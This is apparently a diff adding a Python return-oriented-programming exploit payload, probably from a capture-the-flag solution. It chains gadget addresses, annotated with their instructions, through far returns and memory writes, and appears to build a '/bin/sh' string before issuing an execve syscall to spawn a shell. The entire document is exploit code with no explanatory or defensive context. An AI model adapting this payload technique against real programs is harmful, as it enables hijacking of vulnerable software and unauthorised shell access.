@@ -1,0 +1,103 @@
+payload = p64(0x4011ad)
+#0x00000000004011ad: pop rbp; ret; 
+payload += p64(0xc6000371)+p64(0x40fa3d)
+# 0x000000000040fa3d: pop rcx; ret 0; 
+payload += p64(0x4285b7)+p64(0x4285b7)
+# 0x00000000004285b7: lea eax, [rbp - 0xe0]; mov rsi, rdx; mov rdi, rax; call rcx; 
+payload += b''
+# 0x000000000040fa3d: pop rcx; ret 0; 
+payload += p64(0x40cdbd)
+# 0x40cdbd: xchg ebx, eax ; retf 0
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x445226)+p64(0x4011ac)
+# 0x4011ac: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x40ce9d)+p64(0x40fa3d)
+# 0x000000000040fa3d: pop rcx; ret 0; 
+payload += p64(0x4285b7)+p64(0x4285b7)
+# 0x00000000004285b7: lea eax, [rbp - 0xe0]; mov rsi, rdx; mov rdi, rax; call rcx; 
+payload += b''
+# 0x000000000040fa3d: pop rcx; ret 0; 
+payload += p64(0x40cdbd)
+# 0x40cdbd: xchg ebx, eax ; retf 0
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x44521e)+p64(0x4011ac)
+# 0x4011ac: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x40ce9d)+p64(0x40fa3d)
+# 0x000000000040fa3d: pop rcx; ret 0; 
+payload += p64(0x4285b7)+p64(0x4285b7)
+# 0x00000000004285b7: lea eax, [rbp - 0xe0]; mov rsi, rdx; mov rdi, rax; call rcx; 
+payload += b''
+# 0x000000000040fa3d: pop rcx; ret 0; 
+payload += p64(0x40cdbd)
+# 0x40cdbd: xchg ebx, eax ; retf 0
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x4451ce)+p64(0x4011ac)
+# 0x4011ac: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x6e69630f)+p64(0x40fa3d)
+# 0x000000000040fa3d: pop rcx; ret 0; 
+payload += p64(0x41f1ea)+p64(0x4285b7)
+# 0x00000000004285b7: lea eax, [rbp - 0xe0]; mov rsi, rdx; mov rdi, rax; call rcx; 
+payload += b''
+# 0x000000000041f1ea: pop rdi; ret 0; 
+payload += p64(0x40cdbd)
+# 0x40cdbd: xchg ebx, eax ; retf 0
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x445095)+p64(0x4011ac)
+# 0x4011ac: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x68670f)+p64(0x40fa3d)
+# 0x000000000040fa3d: pop rcx; ret 0; 
+payload += p64(0x41f1ea)+p64(0x4285b7)
+# 0x00000000004285b7: lea eax, [rbp - 0xe0]; mov rsi, rdx; mov rdi, rax; call rcx; 
+payload += b''
+# 0x000000000041f1ea: pop rdi; ret 0; 
+payload += p64(0x40cdbd)
+# 0x40cdbd: xchg ebx, eax ; retf 0
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x445099)+p64(0x4011ac)
+# 0x4011ac: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x445293)+p64(0x40fa3d)
+# 0x000000000040fa3d: pop rcx; ret 0; 
+payload += p64(0x40fa3d)+p64(0x409561)
+# 0x0000000000409561: mov eax, 0; mov edx, dword ptr [rbp - 0x24]; mov rsi, rax; mov edi, edx; call rcx; 
+payload += b''
+# 0x000000000040fa3d: pop rcx; ret 0; 
+payload += p64(0x42e99a)
+# 0x000000000042e99a: mov edx, 0x39fffd6f; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x4451e0)+p64(0x41f1ea)
+# 0x000000000041f1ea: pop rdi; ret 0; 
+payload += p64(0x4451f1)+p64(0x436187)
+# 0x0000000000436187: add byte ptr [rdi], ah; pop rbx; std; jmp qword ptr [rbp + 1]; 
+payload += p64(0x36b44ffe)
+# 0x40cdbd: xchg ebx, eax ; retf 0
+payload += p32(0x401314)+p32(0x33)
+# 0x0000000000401314: add edx, dword ptr [rax - 0x366ffe15]; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x445190)+p64(0x41f1ea)
+# 0x000000000041f1ea: pop rdi; ret 0; 
+payload += p64(0x445189)+p64(0x436187)
+# 0x0000000000436187: add byte ptr [rdi], ah; pop rbx; std; jmp qword ptr [rbp + 1]; 
+payload += p64(0x3b)
+# 0x40cdbd: xchg ebx, eax ; retf 0
+payload += p32(0x41f1ea)+p32(0x33)
+# 0x000000000041f1ea: pop rdi; ret 0; 
+payload += p64(0x445058)+p64(0x402488)
+# 0x0000000000402488: syscall; 
+payload += b''
